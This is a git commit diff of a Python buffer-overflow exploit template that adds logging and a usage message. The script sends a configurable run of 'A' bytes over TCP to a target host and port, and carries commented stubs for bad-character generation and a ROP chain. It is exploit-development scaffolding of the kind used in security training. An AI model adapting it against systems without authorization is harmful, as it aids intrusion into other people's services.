1bc04466296d94aebd18a181608ca8623763d99d
dualfade <dualfade@vadersecurity.com>
2022-05-16 21:58:33 -0400

    + logging, cleanup, fix len default 0

--- codez/python/py3_bo_templ.py
+++ codez/python/py3_bo_templ.py
@@ -1,24 +1,30 @@
 #!/usr/bin/env python3
-# template.py --
+# exploit_template.py --
 # @dualfade
 
 # gen bad chars --
 # pip install badchars
 # badchars -f python | sed 's/^\s*\"./\tb"\\/g' \
-# xclipc -selection clipboard
+# xclip -selection clipboard
 
 # skel refs --
 # https://bit.ly/3KIIjzz --
 
 import socket
 import sys
+import logging
 from optparse import OptionParser
+
+# logging options -- 
+logger = logging.basicConfig(format='%(asctime)s - %(message)s',
+                    datefmt='%d-%b-%y %H:%M:%S',
+                    level=logging.INFO)
 
 # from struct import pack
 
 # defs --
 # def eip_chain():
-#     """ eip chain function -- """
+#     """ eip rop chain function -- """
 
 #     gadgets = [
 #         0xffffffff,         # ;
@@ -48,14 +54,12 @@ def payload_send():
     length = str(options.length)
 
     try:
-        print('[info] sending payload')
-
-        # initial \x41 test payload --
+        # initial \x41 payload --
         buf = b"\x41" * int(length)
         sock_connect(buf)
 
     except OSError as err:
-        error(err)
+        logging.error(err)
 
 def sock_connect(buffer):
     """ socket connect function --"""
@@ -65,14 +69,14 @@ def sock_connect(buffer):
         port = int(options.port)
         target = str(options.target)
 
-        print("[info]: sending => %s" % buffer)
+        logging.info("[info] sending tcp://%s:%s => %s\n" % (target, port, buffer))
         s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('%s' % target, port))
         s.send(buffer)
 
         # get resp --
         resp = s.recv(1024)
-        print(resp)
+        logging.info('[info] resp => %s' % resp)
 
         # finally close socket; ret resp --
         s.close()
@@ -84,9 +88,16 @@ def sock_connect(buffer):
 def error(err):
     """ standard error message -- """
 
-    print('[err] application error %s' % err)
-    print('[err] exiting now.')
+    logging.error('[err] application error %s' % err)
+    logging.error('[err] exiting now.')
     sys.exit(-1)
+
+def script_usage():
+    """ usage; simple examples -- """
+    print('[usage]')
+    print('python exploit.py -h')
+    print('python exploit.py -t 192.168.1.222 -p 31337')
+    print('python exploit.py -t 192.168.1.222 -p 31337 -l 2000\n')
 
 # main --
 if __name__ == "__main__":
@@ -95,19 +106,18 @@ if __name__ == "__main__":
     # parser opts --
     parser = OptionParser()
     parser.add_option('-t', '--target', dest='target', help='target ip address')
-    parser.add_option('-p', '--port', dest='port', help='port')
-    parser.add_option('-l', '--length', dest='length', help='payload length')
+    parser.add_option('-p', '--port', dest='port', help='target port')
+    parser.add_option('-l', '--length', type='int', default='0',
+                      help='payload length, required = false, default 0')
     try:
         (options, args) = parser.parse_args()
-        if (options.target):
+        if (options.target == None):
+            script_usage()
+            error('=> missing input')
 
-            # start --
-            print('[info] starting exploit')
-            payload_send()
-            sys.exit(-1)
         else:
-            print('[err] missing input')
-            print('[err] exiting')
+            logging.info('[info] starting exploit')
+            payload_send()
             sys.exit(-1)
     except SystemExit:
         sys.stdout.write("\n")
